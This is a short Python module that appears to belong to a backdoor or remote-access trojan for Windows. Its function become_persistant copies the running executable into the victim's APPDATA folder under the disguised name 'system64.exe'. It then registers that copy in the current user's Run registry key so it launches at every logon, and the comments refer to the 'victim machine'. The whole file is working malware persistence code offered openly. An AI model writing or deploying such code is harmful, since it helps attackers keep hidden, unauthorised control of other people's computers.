import sys
import shutil
import winreg as reg
import os
def become_persistant(my_socket):
    print("[+] Becoming Persistant by adding keys to startup program")
    #copy the current to some dir
    #appdata
    curr_executable=sys.executable #executable file
    app_data=os.getenv("APPDATA")#directory path of data holder
    
    to_save_file=app_data+"\\"+"system64.exe" #save the file in victim machine
    
    if not os.path.exists(to_save_file): #file does not exists
        shutil.copyfile(curr_executable,to_save_file)
        key=reg.HKEY_CURRENT_USER
        key_value="Software\Microsoft\Windows\CurrentVersion\Run"
        #open the key
        key_obj=reg.OpenKey(key, key_value,0,reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key_obj,"sys file",0,reg.REG_SZ,to_save_file)
        reg.CloseKey(key_obj)
        
        
        
        
        
        
        
        
     
    
    
    